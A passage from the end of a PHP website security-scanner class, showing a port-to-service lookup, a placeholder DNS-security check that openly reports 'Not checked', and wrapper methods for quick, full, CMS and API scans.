            995 => 'POP3S', 3306 => 'MySQL', 3389 => 'RDP'
        ];
        
        return $services[$port] ?? 'Unknown';
    }
    
    private function checkDNSSecurity($url) {
        $host = parse_url($url, PHP_URL_HOST);
        
        return [
            'dnssec' => 'Not checked', // This would require DNS library
            'spf' => 'Not checked',
            'dmarc' => 'Not checked',
            'dkim' => 'Not checked',
            'note' => 'DNS security checks require additional DNS libraries'
        ];
    }
    
    /**
     * Quick scan - basic headers and technology detection only
     */
    public function quickScan($url) {
        return $this->scanWebsite($url, 'quick');
    }
    
    /**
     * Full scan - comprehensive analysis
     */
    public function fullScan($url) {
        return $this->scanWebsite($url, 'full');
    }
    
    /**
     * CMS-specific scan
     */
    public function cmsScan($url) {
        return $this->scanWebsite($url, 'cms');
    }
    
    /**
     * API-specific scan
     */
    public function apiScan($url) {
        return $this->scanWebsite($url, 'api');
    }
}
?>